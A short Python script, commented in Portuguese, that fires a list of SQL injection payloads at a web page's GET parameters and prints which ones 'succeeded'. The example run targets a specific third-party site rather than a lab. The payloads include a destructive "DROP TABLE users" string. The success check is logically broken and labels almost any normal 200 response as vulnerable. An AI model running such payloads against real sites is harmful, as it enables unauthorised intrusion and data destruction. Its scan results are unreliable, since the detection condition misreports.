import requests

def test_sql_injection(url, params):
    """
    Testa vulnerabilidades de SQL Injection em um site.
    
    :param url: URL do site a ser testado.
    :param params: Dicionário contendo os parâmetros a serem enviados na requisição.
    """
    # Lista de payloads comuns para SQL Injection
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' OR 1=1/*",
        "' OR 1=1--",
        "'; DROP TABLE users; --",
    ]

    print(f"Testando {url} para vulnerabilidades de SQL Injection...\n")
    for payload in payloads:
        vulnerable = False
        test_params = {key: (value + payload) for key, value in params.items()}
        try:
            response = requests.get(url, params=test_params, timeout=10)
            if response.status_code == 200 and ("error" not in response.text.lower() or "sql" not in response.text.lower()):
                vulnerable = True
        except requests.exceptions.RequestException as e:
            print(f"Erro durante o teste: {e}")
            return

        if vulnerable:
            print(f"Possível vulnerabilidade detectada com payload: {payload}")
        else:
            print(f"Payload {payload} não foi bem-sucedido.")

# Exemplo de uso
if __name__ == "__main__":
    # URL do site e parâmetros de exemplo
    site_url = "https://www.xff.com.br/site/web/index.php/coletivas?id=142"
    parametros = {"query": "teste"}  # Parâmetros a serem enviados na consulta

    test_sql_injection(site_url, parametros)
